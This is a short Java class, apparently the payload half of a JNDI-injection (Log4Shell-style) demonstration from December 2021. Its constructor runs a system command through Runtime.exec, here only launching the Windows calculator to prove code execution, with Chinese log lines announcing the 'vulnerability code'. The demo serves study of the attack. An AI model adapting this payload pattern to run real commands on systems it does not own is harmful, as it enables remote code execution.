package com.wrh.jndidemo;

/**
 * @author wuruohong
 * @Classname BugFinder
 * @Description D:\pro\mynetty\target\classes\com\wrh\jndidemo\BugFinder.class
 * @Date 2021/12/14 11:14
 */
public class BugFinder {
    public BugFinder() {
        try {
            System.out.println("执行漏洞代码");
            String[] commands = {"calc"};
            Process pc = Runtime.getRuntime().exec(commands);
            pc.waitFor();
            System.out.println("完成执行漏洞代码");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        BugFinder bugFinder = new BugFinder();
    }
}
